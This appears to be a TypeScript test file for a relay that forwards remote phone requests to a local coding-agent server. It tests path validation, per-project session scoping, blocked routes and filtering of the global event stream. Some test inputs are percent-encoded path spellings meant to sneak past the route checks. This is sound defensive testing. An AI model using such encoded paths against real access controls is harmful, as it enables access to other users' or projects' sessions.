    for (const [i, path] of paths.entries()) {
      send(`i${i}`, "POST", path, prompt)
      const r = await collect(relay, `i${i}`)
      expect({ path, status: r.status }).toEqual({ path, status: 400 })
      expect(JSON.parse(r.body)).toEqual({ error: "Bad path." })
    }
    expect(seen).toHaveLength(0)
    expect(applied).toHaveLength(0)
    // reading the same odd spellings is not a request that makes the model run
    send("i-read", "GET", "/session/ses_1/%6dessage")
    expect((await collect(relay, "i-read")).status).toBe(200)
    expect(applied).toHaveLength(0)
  })

  test("routes that do not make the model run are dispatched without touching the session's rules", async () => {
    const { relay, tunnel, seen, applied } = make()
    await tunnel.start()
    const send = sender(relay.sockets[0])
    const calls: Array<[string, string, unknown?]> = [
      ["POST", "/session", { title: "New" }],
      ["PATCH", "/session/ses_1", { title: "Renamed" }],
      ["DELETE", "/session/ses_1"],
      ["POST", "/session/ses_1/abort"],
      ["POST", "/session/ses_1/fork", {}],
      ["POST", "/session/ses_1/revert", { messageID: "msg_1" }],
      ["POST", "/permission/per_1/reply", { reply: "once" }],
      ["POST", "/session/ses_1/permissions/per_1", { response: "once" }],
      ["GET", "/session/ses_1/message"],
      ["GET", "/session/ses_1/command"],
      ["HEAD", "/session/ses_1/prompt_async"],
      ["OPTIONS", "/session/ses_1/message"],
    ]
    for (const [i, [method, path, body]] of calls.entries()) {
      send(`n${i}`, method, path, body)
      expect({ method, path, status: (await collect(relay, `n${i}`)).status }).toEqual({ method, path, status: 200 })
    }
    expect(seen).toHaveLength(calls.length)
    expect(applied).toHaveLength(0)
  })

  test("the memory of applied modes is capped, and stop() clears it", async () => {
    let patches = 0
    const { tunnel } = make({
      dispatch: async () => {
        patches++
        return Response.json(true)
      },
    })
    const apply = (id: string) => (tunnel as any).applyMode(id, "http://opencode.internal/session/x/message", new Headers(), new AbortController().signal)
    for (let i = 0; i < 505; i++) expect(await apply(`ses_${i}`)).toBe(true)
    expect(patches).toBe(505)
    const modes: Map<string, string> = (tunnel as any).modes
    expect(modes.size).toBe(500)
    // the oldest were dropped, so they are applied again; a recent one is not
    expect(modes.has("ses_0")).toBe(false)
    expect(modes.has("ses_4")).toBe(false)
    expect(modes.has("ses_5")).toBe(true)
    await apply("ses_504")
    expect(patches).toBe(505)
    await apply("ses_0")
    expect(patches).toBe(506)
    tunnel.stop()
    expect(modes.size).toBe(0)
  })
})

describe("24 Nov: a named session must live in this project; routes left open in 0.1.47", () => {
  const b64s = (v: unknown) => Buffer.from(JSON.stringify(v)).toString("base64")
  const send24 = (ws: any) => (id: string, method: string, path: string, body?: unknown) =>
    ws.send(JSON.stringify({ t: "req", id, method, path, headers: { "content-type": "application/json" }, body: body === undefined ? undefined : b64s(body), auth: { idToken: "test:alice" } }))
  const json24 = (v: unknown) => new TextEncoder().encode(JSON.stringify(v))
  const pathStatus = (m: string, p: string, b?: unknown) => {
    const r = checkRemotePath(p, m, b === undefined ? undefined : json24(b))
    return r.ok ? 200 : r.status
  }
  const hi = { parts: [{ type: "text", text: "hi" }] }

  test("remoteSessionRef reads the session any route names, in all three APIs", () => {
    for (const path of ["/session/ses_1", "/session/ses_1/", "/session/ses_1/message/msg_1", "/SESSION/ses_1/abort", "/session//ses_1/diff", "/api/session/ses_1", "/api/session/ses_1/permission/per_1/reply", "/experimental/session/ses_1/background"])
      expect({ path, ref: remoteSessionRef(path) }).toEqual({ path, ref: { id: "ses_1" } })
    for (const path of ["/session", "/session/", "/session/status", "/SESSION/Status", "/api/session", "/experimental/session", "/event", "/global/health", "/sessionx/ses_1"])
      expect({ path, ref: remoteSessionRef(path) }).toEqual({ path, ref: undefined })
    // not a plain id, or a route that only shows after decoding: refused, not guessed at
    for (const path of ["/session/ses%201", "/session/ses.1/message", "/%73ession/ses_1", "/session/a%2Fb", "/%73ession/status"])
      expect({ path, ref: remoteSessionRef(path) }).toEqual({ path, ref: "bad" })
  })

  test("over the wire: a session of another project is refused before anything touches it", async () => {
    const { relay, tunnel, seen, applied, folders } = make()
    folders["ses_other"] = "/home/u/other-project"
    await tunnel.start()
    const send = send24(relay.sockets[0])
    send("o1", "GET", "/session/ses_other/message?directory=/tmp/praex-cli")
    send("o2", "POST", "/session/ses_other/prompt_async?directory=/tmp/praex-cli", hi)
    send("o3", "POST", "/api/session/ses_other/permission/per_1/reply", { reply: "always" })
    send("o4", "DELETE", "/session/ses_other")
    send("o5", "GET", "/experimental/session/ses_other/background")
    for (const id of ["o1", "o2", "o3", "o4", "o5"]) {
      const r = await collect(relay, id)
      expect({ id, status: r.status }).toEqual({ id, status: 403 })
      expect(JSON.parse(r.body)).toEqual({ error: DIRECTORY_REFUSED })
    }
    expect(seen).toHaveLength(0)
    expect(applied).toHaveLength(0) // the computer's mode was not put on the other project's session either
  })

  test("a session in the project, or inside it, goes through; its folder is looked up once and remembered", async () => {
    const { relay, tunnel, seen, lookups, folders } = make()
    folders["ses_sub"] = "/tmp/praex-cli/packages/app"
    await tunnel.start()
    const send = send24(relay.sockets[0])
    send("i1", "GET", "/session/ses_1/message")
    expect((await collect(relay, "i1")).status).toBe(200)
    send("i2", "GET", "/session/ses_1")
    expect((await collect(relay, "i2")).status).toBe(200)
    send("i3", "GET", "/session/ses_sub/diff")
    expect((await collect(relay, "i3")).status).toBe(200)
    expect(lookups).toEqual(["ses_1", "ses_sub"])
    expect(seen.map((r) => new URL(r.url).pathname)).toEqual(["/session/ses_1/message", "/session/ses_1", "/session/ses_sub/diff"])
  })

  test("no such session reaches the server (its own 404 follows); a lookup that fails refuses with 503 and is not remembered", async () => {
    const { relay, tunnel, seen, lookups, folders } = make()
    folders["ses_gone"] = null
    folders["ses_flaky"] = "fail"
    await tunnel.start()
    const send = send24(relay.sockets[0])
    send("g1", "GET", "/session/ses_gone")
    expect((await collect(relay, "g1")).status).toBe(200) // the fake server answers 200 to everything it is given
    send("g2", "GET", "/session/ses_flaky/message")
    const g2 = await collect(relay, "g2")
    expect(g2.status).toBe(503)
    expect(JSON.parse(g2.body)).toEqual({ error: SESSION_CHECK_FAILED })
    expect(seen.map((r) => new URL(r.url).pathname)).toEqual(["/session/ses_gone"])
    folders["ses_flaky"] = "/tmp/praex-cli"
    send("g3", "GET", "/session/ses_flaky/message")
    expect((await collect(relay, "g3")).status).toBe(200)
    expect(lookups).toEqual(["ses_gone", "ses_flaky", "ses_flaky"])
  })

  test("the session list and /session/status are not looked up", async () => {
    const { relay, tunnel, lookups } = make()
    await tunnel.start()
    const send = send24(relay.sockets[0])
    send("l1", "GET", "/session?directory=/tmp/praex-cli")
    send("l2", "GET", "/session/status")
    for (const id of ["l1", "l2"]) expect((await collect(relay, id)).status).toBe(200)
    expect(lookups).toEqual([])
  })

  test("routes left open in 0.1.47 are refused; their neighbours still pass the path check", () => {
    for (const method of ["GET", "HEAD", "POST", "DELETE"]) {
      expect({ method, s: pathStatus(method, "/experimental/session") }).toEqual({ method, s: 403 })
      expect({ method, s: pathStatus(method, "/experimental/session/") }).toEqual({ method, s: 403 })
      expect({ method, s: pathStatus(method, "/sync/start") }).toEqual({ method, s: 403 })
      expect({ method, s: pathStatus(method, "/api/sync/start") }).toEqual({ method, s: 403 })
    }
    for (const path of ["/api/session/ses_1/compact", "/api/session/ses_1/wait", "/API/session/ses_1/Compact"])
      expect({ path, s: pathStatus("POST", path, {}) }).toEqual({ path, s: 403 })
    for (const path of ["/experimental/session/ses_1/background", "/api/session/ses_1", "/api/session/ses_1/context", "/session/ses_1/summarize"])
      expect({ path, s: pathStatus("GET", path) }).toEqual({ path, s: 200 })
  })
})


describe("24 Nov (independent review): other projects' events are taken out of the global event stream", () => {
  const inScope = (full: string) => full === "/tmp/praex-cli" || full.startsWith("/tmp/praex-cli/")
  const ev = (directory: string | undefined, type: string, extra: Record<string, unknown> = {}) => ({ ...(directory === undefined ? {} : { directory }), payload: { type, properties: {}, ...extra } })
  test("keepGlobalEvent: this project's folder and machine-wide events pass, other folders and other projects' details do not", () => {
    expect(keepGlobalEvent(ev("/tmp/praex-cli", "message.updated"), inScope)).toBe(true)
    expect(keepGlobalEvent(ev("/tmp/praex-cli/packages/app", "session.updated"), inScope)).toBe(true)
    expect(keepGlobalEvent(ev("/home/u/other", "message.updated"), inScope)).toBe(false)
    expect(keepGlobalEvent(ev("/tmp/praex-cli-other", "message.updated"), inScope)).toBe(false)
    expect(keepGlobalEvent(ev("relative/path", "message.updated"), inScope)).toBe(false)
    expect(keepGlobalEvent(ev(undefined, "server.heartbeat"), inScope)).toBe(true)
    expect(keepGlobalEvent(ev("global", "installation.update-available"), inScope)).toBe(true)
    expect(keepGlobalEvent({ directory: "global", payload: { type: "project.updated", properties: { worktree: "/tmp/praex-cli" } } }, inScope)).toBe(true)
    expect(keepGlobalEvent({ directory: "global", payload: { type: "project.updated", properties: { worktree: "/home/u/other" } } }, inScope)).toBe(false)
    expect(keepGlobalEvent({ directory: "global", payload: { type: "project.updated", properties: {} } }, inScope)).toBe(false)
  })
  const sse = (events: unknown[]) => events.map((e) => `data: ${JSON.stringify(e)}\n\n`).join("")
  const read = async (s: ReadableStream<Uint8Array>) => new TextDecoder().decode(await new Response(s).arrayBuffer())
  const chunked = (text: string, size: number) => {
    const bytes = new TextEncoder().encode(text)
    return new ReadableStream<Uint8Array>({
      start(c) {
        for (let i = 0; i < bytes.length; i += size) c.enqueue(bytes.subarray(i, i + size))
        c.close()
      },
    })
  }
  test("filterEventStream: blocks cut at any byte boundary, the refused ones dropped, the rest unchanged", async () => {
    const events = [ev(undefined, "server.connected"), ev("/tmp/praex-cli", "a"), ev("/home/u/other", "b"), ev("global", "c"), ev("/home/u/other", "d"), ev("/tmp/praex-cli", "é ünïcode")]
    const want = sse([events[0], events[1], events[3], events[5]])
    for (const size of [1, 3, 7, 64, 100000]) expect(await read(filterEventStream(chunked(sse(events), size), (e) => keepGlobalEvent(e, inScope)))).toBe(want)
    // CRLF blocks and a non-JSON keep-alive comment pass through
    const crlf = `: keep-alive\r\n\r\ndata: ${JSON.stringify(events[2])}\r\n\r\ndata: ${JSON.stringify(events[1])}\r\n\r\n`
    expect(await read(filterEventStream(chunked(crlf, 5), (e) => keepGlobalEvent(e, inScope)))).toBe(`: keep-alive\r\n\r\ndata: ${JSON.stringify(events[1])}\r\n\r\n`)
  })
  test("over the wire: the phone gets only its project's and machine-wide events from /global/event; /event is not touched", async () => {
    const events = [ev(undefined, "server.connected"), ev("/home/u/other", "session.updated"), ev("/tmp/praex-cli", "session.updated"), ev("/home/u/other", "message.part.updated")]
    const { relay, tunnel } = make({ dispatch: async () => new Response(sse(events), { headers: { "content-type": "text/event-stream" } }) })
    await tunnel.start()
    const ws = relay.sockets[0]
    for (const [id, path] of [["e1", "/global/event"], ["e2", "/event?directory=/tmp/praex-cli"]])
      ws.send(JSON.stringify({ t: "req", id, method: "GET", path, headers: {}, auth: { idToken: "test:alice" } }))
    const e1 = await collect(relay, "e1")
    expect(e1.body).toBe(sse([events[0], events[2]]))
    expect(e1.body).not.toContain("/home/u/other")
    // the per-project stream already names its folder, which is checked; its body is passed as is
    expect((await collect(relay, "e2")).body).toBe(sse(events))
  })
})
